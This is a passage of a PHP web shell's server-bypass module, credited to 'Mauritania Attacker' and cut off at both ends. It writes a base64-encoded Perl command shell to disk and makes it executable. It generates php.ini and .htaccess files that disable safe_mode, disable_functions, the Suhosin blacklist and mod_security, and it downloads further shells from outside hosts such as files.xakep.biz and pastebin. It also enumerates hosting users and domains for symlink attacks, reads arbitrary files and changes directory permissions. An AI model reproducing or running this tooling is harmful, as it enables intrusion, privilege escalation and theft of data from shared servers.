ZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCgl9DQoNCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0KCXsNCgkJJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCgl9DQoJZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCgl7DQoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGENCiMgZmlsZSwgb3RoZXJ3aXNlIGl0IHN0YXJ0cyB0aGUgdXBsb2FkIHByb2Nlc3MuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVXBsb2FkRmlsZQ0Kew0KCSMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSB1cGxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCSZQcmludEZpbGVVcGxvYWRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCQlyZXR1cm47DQoJfQ0KCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCg0KCSMgc3RhcnQgdGhlIHVwbG9hZGluZyBwcm9jZXNzDQoJcHJpbnQgIlVwbG9hZGluZyAkVHJhbnNmZXJGaWxlIHRvICRDdXJyZW50RGlyLi4uPGJyPiI7DQoNCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkDQoJY2hvcCgkVGFyZ2V0TmFtZSkgaWYgKCRUYXJnZXROYW1lID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJJFRyYW5zZmVyRmlsZSA9fiBtIShbXi9eXFxdKikkITsNCgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsNCg0KCSRUYXJnZXRGaWxlU2l6ZSA9IGxlbmd0aCgkaW57J2ZpbGVkYXRhJ30pOw0KCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdA0KCWlmKC1lICRUYXJnZXROYW1lICYmICRPcHRpb25zIG5lICJvdmVyd3JpdGUiKQ0KCXsNCgkJcHJpbnQgIkZhaWxlZDogRGVzdGluYXRpb24gZmlsZSBhbHJlYWR5IGV4aXN0cy48YnI+IjsNCgl9DQoJZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQNCgl7DQoJCWlmKG9wZW4oVVBMT0FERklMRSwgIj4kVGFyZ2V0TmFtZSIpKQ0KCQl7DQoJCQliaW5tb2RlKFVQTE9BREZJTEUpIGlmICRXaW5OVDsNCgkJCXByaW50IFVQTE9BREZJTEUgJGlueydmaWxlZGF0YSd9Ow0KCQkJY2xvc2UoVVBMT0FERklMRSk7DQoJCQlwcmludCAiVHJhbnNmZXJlZCAkVGFyZ2V0RmlsZVNpemUgQnl0ZXMuPGJyPiI7DQoJCQlwcmludCAiRmlsZSBQYXRoOiAkVGFyZ2V0TmFtZTxicj4iOw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJcHJpbnQgIkZhaWxlZDogJCE8YnI+IjsNCgkJfQ0KCX0NCglwcmludCAiIjsNCgkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCg0KCSZQcmludFBhZ2VGb290ZXI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlbmFtZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhDQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluaw0KIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBEb3dubG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgZG93bmxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJCXJldHVybjsNCgl9DQoJDQoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KCWlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCgl7DQoJCSRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCgl9DQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUNCgl7DQoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQoJfQ0KDQoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCgl7DQoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQoJfQ0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQoJew0KCQkmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgTWFpbiBQcm9ncmFtIC0gRXhlY3V0aW9uIFN0YXJ0cyBIZXJlDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQomUmVhZFBhcnNlOw0KJkdldENvb2tpZXM7DQoNCiRTY3JpcHRMb2NhdGlvbiA9ICRFTlZ7J1NDUklQVF9OQU1FJ307DQokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307DQokTG9naW5QYXNzd29yZCA9ICRpbnsncCd9Ow0KJFJ1bkNvbW1hbmQgPSAkaW57J2MnfTsNCiRUcmFuc2ZlckZpbGUgPSAkaW57J2YnfTsNCiRPcHRpb25zID0gJGlueydvJ307DQoNCiRBY3Rpb24gPSAkaW57J2EnfTsNCiRBY3Rpb24gPSAibG9naW4iIGlmKCRBY3Rpb24gZXEgIiIpOyAjIG5vIGFjdGlvbiBzcGVjaWZpZWQsIHVzZSBkZWZhdWx0DQoNCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQNCiRDdXJyZW50RGlyID0gJGlueydkJ307DQpjaG9wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7DQoNCiRMb2dnZWRJbiA9ICRDb29raWVzeydTQVZFRFBXRCd9IGVxICRQYXNzd29yZDsNCg0KaWYoJEFjdGlvbiBlcSAibG9naW4iIHx8ICEkTG9nZ2VkSW4pICMgdXNlciBuZWVkcy9oYXMgdG8gbG9naW4NCnsNCgkmUGVyZm9ybUxvZ2luOw0KDQp9DQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikgIyB1c2VyIHdhbnRzIHRvIHJ1biBhIGNvbW1hbmQNCnsNCgkmRXhlY3V0ZUNvbW1hbmQ7DQp9DQplbHNpZigkQWN0aW9uIGVxICJ1cGxvYWQiKSAjIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZQ0Kew0KCSZVcGxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAjIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlDQp7DQoJJkRvd25sb2FkRmlsZTsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImxvZ291dCIpICMgdXNlciB3YW50cyB0byBsb2dvdXQNCnsNCgkmUGVyZm9ybUxvZ291dDsNCn0=';

$file = fopen("vw.root" ,"w+");
$write = fwrite ($file ,base64_decode($cgipl));
fclose($file);
chmod("vw.root",0755);
echo "<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Bypass Perl Security</span><br><br><iframe src=cgipl/vw.root width=75% height=50% frameborder=0></iframe>
 
</div>"; 
}
?>
<?

}elseif($_GET['do'] == 'posget') {?>
<?
{
echo"<center><h1>Yeah Let's Try Bypass This Server And Smile</h1><br><img src=https://media.giphy.com/media/cGrCQk6zbsvLO/giphy.gif><br><br>";		
echo '<center><div id="menu">';		
echo "<a href='?dir=$dir&do=grasy'>Bypass /etc/passwd</a><br><br>";
echo "<a href='?dir=$dir&do=nemcon'>Bypass Users Server</a><br><br>";
echo "<a href='?dir=$dir&do=cgipl'>Bypass Perl Security</a><br><br>";
echo "<a href='?dir=$dir&do=bypsrootwzp'>Bypass Root Path with Zip File</a><br><br>";
echo "<a href='?dir=$dir&do=bforb'>Bypass Root Path with system function</a><br><br>";
echo "<a href='?dir=$dir&do=rootexecbpass'>Bypass Root Path with exec function</a><br><br>";
echo "<a href='?dir=$dir&do=rootshelleexecbpass'>Bypass Root Path with shell_exec function</a><br><br>";
echo "<a href='?dir=$dir&do=posget'>Bypass posix_getpwuid</a><br><br>";
echo "<a href='?dir=$dir&do=suphp'>Bypass PHP Suhosin function blacklist</a><br><br>";
echo "<a href='?dir=$dir&do=suppet'>Bypass Functions suPHP_ConfigPath</a><br><br>";
echo "<a href='?dir=$dir&do=setphr'>Bypass suPHP Security</a><br><br>";
echo "<a href='?dir=$dir&do=simpelb'>Simple Bypasser</a><br><br>";
echo "<a href='?dir=$dir&do=ritf'>Read Files</a><br><br>";
echo "<a href='?dir=$dir&do=baidir'>Bypass Chmod Directory</a><br><br>";
echo "<a href='?dir=$dir&do=smod14'>Bypass SafeMode 2014 Priv8</a><br><br>";
echo "<a href='?dir=$dir&do=nemcon'>Bypass Users Server</a><br><br>";
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass posix_getpwuid</span><center><br>';
echo '<form method="POST">
<input size="20" value="0" name="min" type="text">
<font face="Tahoma" color="#007700" size="2pt"> to </font>
<input size="20" value="1024" name="max" type="text"> <input value="Symlink" name="" type="submit">
</form><br>';
if($_POST){
$min = $_POST['min'];
$max = $_POST['max'];
echo"<div class='tmp'><table align='center' width='40%'><td><font color='#e4e4e4'><b>Domains</b></font></td><td><font color='#e4e4e4'><b>Users</b></font></td><td><font color='#e4e4e4'><b>Symlink</b> </font></td>";

$p = 0;
error_reporting(0);
$list = scandir("/var/named");
for($p = $min; $min <= $max; $p++)
{
$user = posix_getpwuid($p);
if(is_array($user)){
	
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
if($owner['name'] == $user['name'])
{
$i += 1;
$cheechee = checkAlexa($domain);
echo "<tr><td class='cone'><a href='http://".$domain." '>".$domain."</a> <font color='#00bb00'>- </font><font color='#e4e4e4'>".$cheechee."</font></td><center><td class='cone'><font color='#00bb00'>".$user['name']."</font></center></td><td class='cone'><center><a href='sim/rut".$owner['dir']."/public_html/' target='_blank'>Dir</a></center></td>";
}
}
}	
}
}
echo "<center><font face='Tahoma' color='#00bb00' size='2pt'>Total Domains Found:</font><font face='Tahoma' color='#00bb00' size='2pt'> ".$i."</font></center><br />";
}
echo "</table></div><br><br>";
}
?>
<?
}elseif($_GET['do'] == 'suphp') {?>
<?{
echo"<center><h1>Yeah Let's Try Bypass This Server And Smile</h1><br><img src=https://media.giphy.com/media/cGrCQk6zbsvLO/giphy.gif><br><br>";		
echo '<center><div id="menu">';		
echo "<a href='?dir=$dir&do=grasy'>Bypass /etc/passwd</a><br><br>";
echo "<a href='?dir=$dir&do=nemcon'>Bypass Users Server</a><br><br>";
echo "<a href='?dir=$dir&do=cgipl'>Bypass Perl Security</a><br><br>";
echo "<a href='?dir=$dir&do=bypsrootwzp'>Bypass Root Path with Zip File</a><br><br>";
echo "<a href='?dir=$dir&do=bforb'>Bypass Root Path with system function</a><br><br>";
echo "<a href='?dir=$dir&do=rootexecbpass'>Bypass Root Path with exec function</a><br><br>";
echo "<a href='?dir=$dir&do=rootshelleexecbpass'>Bypass Root Path with shell_exec function</a><br><br>";
echo "<a href='?dir=$dir&do=posget'>Bypass posix_getpwuid</a><br><br>";
echo "<a href='?dir=$dir&do=suphp'>Bypass PHP Suhosin function blacklist</a><br><br>";
echo "<a href='?dir=$dir&do=suppet'>Bypass Functions suPHP_ConfigPath</a><br><br>";
echo "<a href='?dir=$dir&do=setphr'>Bypass suPHP Security</a><br><br>";
echo "<a href='?dir=$dir&do=simpelb'>Simple Bypasser</a><br><br>";
echo "<a href='?dir=$dir&do=ritf'>Read Files</a><br><br>";
echo "<a href='?dir=$dir&do=baidir'>Bypass Chmod Directory</a><br><br>";
echo "<a href='?dir=$dir&do=smod14'>Bypass SafeMode 2014 Priv8</a><br><br>";

echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass PHP Suhosin Function Blacklist</span><center><br>';
echo "<br><form method='POST'>
<input type='text' name='path' size='25' value=".dirname(__FILE__)." '>
<input type='text' name='shell' size='25' value='http://files.xakep.biz/shells/PHP/wso.txt'>
<input type='submit' value='Bypass' name='start'><br><br>";
echo "<textarea class='area' rows='15' cols='78'>virusa worm Mode :) \n";
if($_POST['start']) {
$path = $_POST['path'];
$file = $_POST['shell'];
$htaccess = "suPHP_ConfigPath $path/vworm/php.ini";
$phpini = "c2FmZV9tb2RlID0gT0ZGCnN1aG9zaW4uZXhlY3V0b3IuZnVuYy5ibGFja2xpc3QgPSBOT05FCmRpc2FibGVfZnVuY3Rpb25zID0gTk9ORQ==";
$dir = "vworm"; 
if(file_exists($dir)) {
echo "[+] vworm Folder There Before :)\n";
} else {
@mkdir($dir); {
echo "[+] vworm Folder Created :D\n";
} }
#Generate Sh3LL
$fopen = fopen("vworm/vw.php",'w');
$shell = @file_get_contents($file);
$swrite = fwrite($fopen ,$shell);
if($swrite){
echo "[+] Shell Has Been Generated Name : vw.php \n";
} else {
echo "[~] Can't Generate Shell\n";
}
fclose($fopen);
#Generate Htaccess
$hopen = fopen("vworm/.htaccess", "w");
$hwrite = fwrite($hopen, $htaccess);
if($hwrite){
echo "[+] htaccess Generated\n";
} else {
echo "[~] Can't Generate htaccess\n";
}
fclose($hopen);
$ini = fopen("vworm/php.ini" ,"w");
$php = fwrite($ini, base64_decode($phpini));
if($php){
echo "[+] PHP.INI Generated";
} else {
echo "[-] Can't Generate PHP.INI";
}
}
echo "</textarea>";
}

?>
<?
}elseif($_GET['do'] == 'simpelb') {?>	

<?
{
echo"<center><h1>Yeah Let's Try Bypass This Server And Smile</h1><br><img src=https://media.giphy.com/media/cGrCQk6zbsvLO/giphy.gif><br><br>";		
echo '<center><div id="menu">';		
echo "<a href='?dir=$dir&do=grasy'>Bypass /etc/passwd</a><br><br>";
echo "<a href='?dir=$dir&do=nemcon'>Bypass Users Server</a><br><br>";
echo "<a href='?dir=$dir&do=cgipl'>Bypass Perl Security</a><br><br>";
echo "<a href='?dir=$dir&do=bypsrootwzp'>Bypass Root Path with Zip File</a><br><br>";
echo "<a href='?dir=$dir&do=bforb'>Bypass Root Path with system function</a><br><br>";
echo "<a href='?dir=$dir&do=rootexecbpass'>Bypass Root Path with exec function</a><br><br>";
echo "<a href='?dir=$dir&do=rootshelleexecbpass'>Bypass Root Path with shell_exec function</a><br><br>";
echo "<a href='?dir=$dir&do=posget'>Bypass posix_getpwuid</a><br><br>";
echo "<a href='?dir=$dir&do=suphp'>Bypass PHP Suhosin function blacklist</a><br><br>";
echo "<a href='?dir=$dir&do=suppet'>Bypass Functions suPHP_ConfigPath</a><br><br>";
echo "<a href='?dir=$dir&do=setphr'>Bypass suPHP Security</a><br><br>";
echo "<a href='?dir=$dir&do=simpelb'>Simple Bypasser</a><br><br>";
echo "<a href='?dir=$dir&do=ritf'>Read Files</a><br><br>";
echo "<a href='?dir=$dir&do=baidir'>Bypass Chmod Directory</a><br><br>";
echo "<a href='?dir=$dir&do=smod14'>Bypass SafeMode 2014 Priv8</a><br><br>";
echo "<a href='?dir=$dir&do=nemcon'>Bypass Users Server</a><br><br>";
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Simple Bypasser</span><center><br>';
echo '<br><font face="Tahoma" color="#007700" size="2pt">Create Folder : </font>
<input type="text" name="dir" size="43" value="worm"> 
<input type="submit" value="Create" name="folder"> <br> <br>
<font face="Tahoma" color="#007700" size="2pt">Get File : </font><br>
<input type="text" name="get" size="16" value="url file .txt"> 
<input type="text" name="name" size="15" value="worm.php">
<input type="text" name="select" size="16" value='.dirname(__FILE__).'>
<input type="submit" value="GET" name="fileget"> <br> <br>
<font face="Tahoma" color="#007700" size="2pt">Fopen File : </font><br>
<input type="text" name="save" size="29" value="vwo.php">
<input type="text" name="path2" size="29" value='.dirname(__FILE__).'><br><br>
<textarea class="area" name="source" cols="78" rows="15">PHP Code</textarea><br><br>
<input type="submit" value="Save" name="fopen">';

if($_POST['folder']) {
$mk = $_POST['dir'];
$func = "bWtkaXI=";
$de = base64_decode($func);
$rules1 = $de($mk);
if ($mk) { 
echo "<br><b class='cone'>[+] Done [ $mk ] Created !</b>";
} }
# File Get Contents
if($_POST['fileget']) {
$get = $_POST['get'];
$n4m = $_POST['name'];
$path = $_POST['select'];
$func2 = "ZmlsZV9nZXRfY29udGVudHM=";
$de2 = base64_decode($func2);
$rules2 = $de2($get);
$open = fopen("$path/$n4m", 'w'); 
fwrite($open,$rules2);
fclose($open);
if($get) { 
echo "done";
} }
#
# fopen File
if($_POST['fopen']) {
$save = $_POST['save'];
$path2 = $_POST['path2'];
$open2 = fopen("$path2/$save", 'w');
$source1 = $_POST['source'];
$source2 = stripslashes($source1);
fwrite($open2 ,$source2);
fclose($open2);
if($open2) {
echo "<b class='tmp'>Done</b>";
} }
}
?>

<?
}elseif($_GET['do'] == 'ritf') {?>	
<?{
echo"<center><h1>Yeah Let's Try Bypass This Server And Smile</h1><br><img src=https://media.giphy.com/media/cGrCQk6zbsvLO/giphy.gif><br><br>";		
echo '<center><div id="menu">';		
echo "<a href='?dir=$dir&do=grasy'>Bypass /etc/passwd</a><br><br>";
echo "<a href='?dir=$dir&do=nemcon'>Bypass Users Server</a><br><br>";
echo "<a href='?dir=$dir&do=cgipl'>Bypass Perl Security</a><br><br>";
echo "<a href='?dir=$dir&do=bypsrootwzp'>Bypass Root Path with Zip File</a><br><br>";
echo "<a href='?dir=$dir&do=bforb'>Bypass Root Path with system function</a><br><br>";
echo "<a href='?dir=$dir&do=rootexecbpass'>Bypass Root Path with exec function</a><br><br>";
echo "<a href='?dir=$dir&do=rootshelleexecbpass'>Bypass Root Path with shell_exec function</a><br><br>";
echo "<a href='?dir=$dir&do=posget'>Bypass posix_getpwuid</a><br><br>";
echo "<a href='?dir=$dir&do=suphp'>Bypass PHP Suhosin function blacklist</a><br><br>";
echo "<a href='?dir=$dir&do=suppet'>Bypass Functions suPHP_ConfigPath</a><br><br>";
echo "<a href='?dir=$dir&do=setphr'>Bypass suPHP Security</a><br><br>";
echo "<a href='?dir=$dir&do=simpelb'>Simple Bypasser</a><br><br>";
echo "<a href='?dir=$dir&do=ritf'>Read Files</a><br><br>";
echo "<a href='?dir=$dir&do=baidir'>Bypass Chmod Directory</a><br><br>";
echo "<a href='?dir=$dir&do=smod14'>Bypass SafeMode 2014 Priv8</a><br><br>";
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Read File</span><center><br>';
echo "<form method='POST' /> 
<select name='website'>
<option value='show_source'>show_source</option>
<option value='highlight_file'>highlight_file</option>
<option value='readfile'>readfile</option>
<option value='include'>include</option>
<option value='require'>require</option>
<option value='file'>file</option>
<option value='fread'>fread</option>
<option value='file_get_contents'>file_get_contents</option>
<option value='fgets'>fgets</option> 
<input type='text' name='file' size='22' /><input type='submit' name='start'   value='Read Now' />
</select>";

function readfils($file) {

$web = $_POST['website'];

switch ($web)
{
case 'show_source': $show =  @show_source($file);  break;

case 'highlight_file': $highlight = @highlight_file($file); break;

case 'readfile': $readfile = @readfile($file);  break;

case 'include': $include = @include($file); break;

case 'require': $require = @require($file);  break;

case 'file': $file =  @file($file);  foreach ($file as $key => $value) {  print $value; }  break;

case 'fread': $fopen = @fopen($file,"r") or die("Unable to open file!"); $fread = @fread($fopen,90000); fclose($fopen); print_r($fread); break;

case 'file_get_contents': $file_get_contents =  @file_get_contents($file); print_r($file_get_contents);  break;

case 'fgets': $fgets = @fopen($file,"r") or die("Unable to open file!"); while(!feof($fgets)) { echo fgets($fgets); } fclose($fgets); break;

default: 
echo "{$web} Not There"; 
} 
}
	  
echo "<br><br><textarea class='area' rows='15' cols='68' />";
$file = trim($_POST['file']);
if($_POST['start'])
{
readfils($file); }
echo "</textarea>";
}
?>
<?
}elseif($_GET['do'] == 'baidir') {?>	
<?{
echo"<center><h1>Yeah Let's Try Bypass This Server And Smile</h1><br><img src=https://media.giphy.com/media/cGrCQk6zbsvLO/giphy.gif><br><br>";		
echo '<center><div id="menu">';		
echo "<a href='?dir=$dir&do=grasy'>Bypass /etc/passwd</a><br><br>";
echo "<a href='?dir=$dir&do=nemcon'>Bypass Users Server</a><br><br>";
echo "<a href='?dir=$dir&do=cgipl'>Bypass Perl Security</a><br><br>";
echo "<a href='?dir=$dir&do=bypsrootwzp'>Bypass Root Path with Zip File</a><br><br>";
echo "<a href='?dir=$dir&do=bforb'>Bypass Root Path with system function</a><br><br>";
echo "<a href='?dir=$dir&do=rootexecbpass'>Bypass Root Path with exec function</a><br><br>";
echo "<a href='?dir=$dir&do=rootshelleexecbpass'>Bypass Root Path with shell_exec function</a><br><br>";
echo "<a href='?dir=$dir&do=posget'>Bypass posix_getpwuid</a><br><br>";
echo "<a href='?dir=$dir&do=suphp'>Bypass PHP Suhosin function blacklist</a><br><br>";
echo "<a href='?dir=$dir&do=suppet'>Bypass Functions suPHP_ConfigPath</a><br><br>";
echo "<a href='?dir=$dir&do=setphr'>Bypass suPHP Security</a><br><br>";
echo "<a href='?dir=$dir&do=simpelb'>Simple Bypasser</a><br><br>";
echo "<a href='?dir=$dir&do=ritf'>Read Files</a><br><br>";
echo "<a href='?dir=$dir&do=baidir'>Bypass Chmod Directory</a><br><br>";
echo "<a href='?dir=$dir&do=smod14'>Bypass SafeMode 2014 Priv8</a><br><br>";
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Chmod Directory Priv8</span><br>Coded By Mauritania Attacker<center><br><br>';
echo '<form action="" method="post">
<p>
<center>
<input type="text" name="file" placeholder="/home/user/public_html/directory">
<input type="submit" name="bypass" value="Bypass Chmod Dir">
</form></center></p>';

if($_POST)
{
$mauritania = $_POST['file'];
$ch = @chmod($mauritania,'0311');
if($ch)
{
echo "[+] Directory  <font face='Tahoma' size='3' color='#b0b000'> =>{$mauritania}               => [+] Permission Changed Successfully Bypassed ^_^ [+]";
}
else
{
echo "[-] Directory  <font face='Tahoma' size='3' color='red'> =>{$mauritania}                 => [-] Permission can't be changed , maybe chmod function is disabled :( [-]";
}
}
}
?>
<?}elseif($_GET['do'] == 'smod14') {?>	
<?{
echo"<center><h1>Yeah Let's Try Bypass This Server And Smile</h1><br><img src=https://media.giphy.com/media/cGrCQk6zbsvLO/giphy.gif><br><br>";		
echo '<center><div id="menu">';		
echo "<a href='?dir=$dir&do=grasy'>Bypass /etc/passwd</a><br><br>";
echo "<a href='?dir=$dir&do=nemcon'>Bypass Users Server</a><br><br>";
echo "<a href='?dir=$dir&do=cgipl'>Bypass Perl Security</a><br><br>";
echo "<a href='?dir=$dir&do=bypsrootwzp'>Bypass Root Path with Zip File</a><br><br>";
echo "<a href='?dir=$dir&do=bforb'>Bypass Root Path with system function</a><br><br>";
echo "<a href='?dir=$dir&do=rootexecbpass'>Bypass Root Path with exec function</a><br><br>";
echo "<a href='?dir=$dir&do=rootshelleexecbpass'>Bypass Root Path with shell_exec function</a><br><br>";
echo "<a href='?dir=$dir&do=posget'>Bypass posix_getpwuid</a><br><br>";
echo "<a href='?dir=$dir&do=suphp'>Bypass PHP Suhosin function blacklist</a><br><br>";
echo "<a href='?dir=$dir&do=suppet'>Bypass Functions suPHP_ConfigPath</a><br><br>";
echo "<a href='?dir=$dir&do=setphr'>Bypass suPHP Security</a><br><br>";
echo "<a href='?dir=$dir&do=simpelb'>Simple Bypasser</a><br><br>";
echo "<a href='?dir=$dir&do=ritf'>Read Files</a><br><br>";
echo "<a href='?dir=$dir&do=baidir'>Bypass Chmod Directory</a><br><br>";
echo "<a href='?dir=$dir&do=smod14'>Bypass SafeMode 2014 Priv8</a><br><br>";
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass SafeMode 2014 Priv8</span><br>Coded by Mauritania Attacker<center><br><br>';
echo "<br><form method='POST'>
<center><font color='#007700' size='2' face='shell'>Cwd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><input type='text' size='40' name='zero' value=".dirname(__FILE__)." &lt;font color='#b0b000' size='8' face='Tahoma'></font></center>
<center><font color='#007700' size='2' face='shell'>Shell&nbsp;&nbsp;&nbsp;&nbsp;</font><input type='text' size='40' name='shell' value='http://pastebin.com/raw.php?i=2gmt5XFH' &lt;font color='#b0b000' size='8' face='Tahoma'></font></center>
<center><font color='#007700' size='2' face='shell'>ini.php&nbsp;</font><input type='text' size='40' name='rim' value='http://pastebin.com/raw.php?i=sEbXwVvt' &lt;font color='#b0b000' size='8' face='Tahoma'></font></center><br>
<center><input type='submit' value='Bypass SafeMode' name='start' ><br></font></center><br>";
echo "<center><textarea class='area' rows='12' cols='60'>Results Will Appear Here ^_^ 
";
if($_POST['start']) {
$zero = $_POST['zero'];
$file = $_POST['shell'];
$mauritania = $_POST['rim'];
$htaccess = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckCookieFormat Off
SecFilterCheckUnicodeEncoding Off
SecFilterNormalizeCookies Off
</IfModule>
<Limit GET POST>
order deny,allow
deny from all
allow from all
</Limit>
<Limit PUT DELETE>
order deny,allow
deny from all
</Limit>
SetEnv PHPRC $zero/ghost/php.ini";

$phpini = "c2FmZV9tb2RlID0gT0ZGDQpTYWZlX21vZGVfZ2lkID0gT0ZGDQpkaXNhYmxlX2Z1bmN0aW9ucyA9IE5PTkUNCmRpc2FibGVfY2xhc3NlcyA9IE5PTkUNCm9wZW5fYmFzZWRpciA9IE9GRg0Kc3Vob3Npbi5leGVjdXRvci5mdW5jLmJsYWNrbGlzdCA9IE5PTkU=";
$dir = "ghost"; 
if(file_exists($dir)) {
echo "[+] ghost Folder Already Exist are you drunk :o xD !
";
} else {
@mkdir($dir); {
echo "[+] ghost Folder Has Been Created Nygga :3 !
";
} }
#Generate Sh3LL
$fopen = fopen("ghost/priv8.php5",'w');
$shell = @file_get_contents($file);
$swrite = fwrite($fopen ,$shell);
if($swrite){
echo "Shell Has Been Downloaded : $zero/ghost/priv8.php5 
";
} else {
echo "Can't Download Shell :( do it manually :D 
";
}
fclose($fopen);
#Generate Htaccess
$kolsv = fopen("ghost/.htaccess", "w");
